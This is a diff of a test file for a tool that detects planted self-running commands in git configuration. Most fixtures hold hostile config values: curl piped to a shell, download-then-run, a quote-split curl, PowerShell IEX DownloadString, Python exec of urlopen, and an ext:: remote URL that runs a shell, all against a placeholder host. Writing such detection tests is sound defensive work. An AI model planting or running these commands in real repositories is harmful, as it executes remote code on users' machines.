@@ -377,16 +377,44 @@ class TestSelfFiringCommandsThatReachTheNetwork(TestPlantedCommandsAreCaught):
         self.append_config(repo, '[core]\n\tfsmonitor = sh -c \\"$(curl -fsSL https://x.invalid)\\"\n')
         self.assert_tier(repo, CONFIRMED)
 
-    def test_a_download_then_run(self):
+    def test_a_download_then_run_is_at_least_suspicious(self):
         repo = self.repo()
         self.append_config(repo, "[core]\n\tfsmonitor = sh -c \\\"curl -o /tmp/a https://x.invalid; "
                                  "sh /tmp/a\\\"\n")
+        self.assert_tier(repo, HEURISTIC)
+
+    def test_a_split_quoted_fetch_to_shell(self):
+        repo = self.repo()
+        self.append_config(repo, "[core]\n\tfsmonitor = c''url -s https://x.invalid | sh\n")
         self.assert_tier(repo, CONFIRMED)
+
+    def test_a_bare_script_name(self):
+        repo = self.repo()
+        self.hook(repo, "x", "#!/bin/sh\ncurl -s https://x.invalid | sh\n")
+        self.append_config(repo, "[core]\n\tfsmonitor = sh x\n")
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_powershell_that_evaluates_a_download(self):
+        repo = self.repo()
+        self.append_config(repo, '[filter "a"]\n\tsmudge = pwsh -c \\"IEX (New-Object Net.WebClient)'
+                                 '.DownloadString(1)\\"\n')
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_perl_with_a_module_option_is_inline_code(self):
+        repo = self.repo()
+        self.append_config(repo, "[core]\n\tfsmonitor = perl -MIO::Socket::INET -e 1\n")
+        self.assert_tier(repo, HEURISTIC)
+
+    def test_a_clone_then_run(self):
+        repo = self.repo()
+        self.append_config(repo, "[core]\n\tfsmonitor = git clone -q https://x.invalid/y /tmp/y "
+                                 "&& sh /tmp/y/run\n")
+        self.assert_tier(repo, HEURISTIC)
 
     def test_python_urlopen(self):
         repo = self.repo()
-        self.append_config(repo, '[filter "x"]\n\tclean = python3 -c \\"import urllib.request as u;'
-                                 'exec(u.urlopen(1).read())\\"\n')
+        self.append_config(repo, '[filter "x"]\n\tclean = "python3 -c \'import urllib.request as u;'
+                                 'exec(u.urlopen(1).read())\'"\n')
         self.assert_tier(repo, CONFIRMED)
 
     def test_a_filter_no_attribute_selects(self):
@@ -402,13 +430,41 @@ class TestSelfFiringCommandsThatReachTheNetwork(TestPlantedCommandsAreCaught):
 
     def test_the_default_ssh_key_command(self):
         repo = self.repo()
-        self.append_config(repo, '[gpg "ssh"]\n\tdefaultKeyCommand = curl -s https://x.invalid\n')
+        self.append_config(repo, '[gpg "ssh"]\n\tdefaultKeyCommand = curl -s https://x.invalid | sh\n')
         self.assert_tier(repo, CONFIRMED)
 
     def test_a_remote_address_that_is_a_command(self):
         repo = self.repo()
-        self.append_config(repo, '[remote "origin"]\n\turl = "ext::sh -c curl% -s% https://x.invalid"\n')
+        self.append_config(repo, '[remote "origin"]\n\turl = "ext::sh -c curl% -s% https://x.invalid|sh"\n')
         self.assert_tier(repo, CONFIRMED)
+
+
+class TestOrdinaryCodeNearASelfFiringKeyIsNotConfirmed(ExecSurfaceSandbox):
+    """Check programs a self-firing key runs whose text merely mentions network words."""
+
+    def assert_not_confirmed(self, repo: Path):
+        self.assertEqual([f.evidence for f in self.graded(repo)[CONFIRMED]], [])
+
+    def test_a_textconv_script_with_ordinary_names(self):
+        repo = self.repo()
+        self.hook(repo / "scripts", "prettyjson", "#!/usr/bin/env node\nconst nc = 2;\n"
+                                                  "// http.get( is not called\ncache.fetch( 'key' );\n")
+        self.append_config(repo, '[diff "json"]\n\ttextconv = scripts/prettyjson\n')
+        self.assert_not_confirmed(repo)
+
+    def test_a_filter_option_that_looks_like_a_tool(self):
+        repo = self.repo()
+        self.append_config(repo, '[filter "x"]\n\tclean = dotnet run --project tools/Filter -- nc-mode\n')
+        self.assert_not_confirmed(repo)
+
+    def test_a_compiled_program(self):
+        repo = self.repo()
+        binary = repo / "tools" / "kw"
+        binary.parent.mkdir(parents=True)
+        binary.write_bytes(b"\x7fELF\0\0NC curl | sh IWR\0")
+        binary.chmod(0o755)
+        self.append_config(repo, '[filter "kw"]\n\tsmudge = tools/kw\n')
+        self.assert_not_confirmed(repo)
 
 
 class TestARepositoryInAScratchDirectoryIsItsOwn(ExecSurfaceSandbox):
